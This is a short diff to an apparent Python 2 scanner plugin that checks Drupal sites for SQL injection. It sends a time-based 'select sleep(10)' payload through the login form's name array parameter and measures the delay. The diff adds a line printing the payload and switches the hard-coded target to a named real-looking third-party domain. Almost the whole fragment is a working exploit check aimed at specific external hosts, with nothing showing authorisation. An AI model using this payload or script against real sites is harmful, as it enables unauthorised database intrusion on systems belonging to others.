@@ -23,6 +23,7 @@ def Audit(services):
 					url = services['url']
 					target = '%s/?q=node&destination=node' % url
 					post_data = "name[0%20;select+sleep(10);;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
+					print post_data
 					start1 = time()
 					print 'start1:',start1
 					urllib2.urlopen(url=url).read()
@@ -47,6 +48,7 @@ def Audit(services):
 #	untest yet
 # ----------------------------------------------------------------------------------------------------
 if __name__=='__main__':
-	services = {'url':'http://drupalnews.cn','cms':'Drupal'}
+	url = 'http://kss.hengtiansoft.com'
+	services = {'url':url,'cms':'Drupal'}
 	pprint(Audit(services))
 	pprint(services)
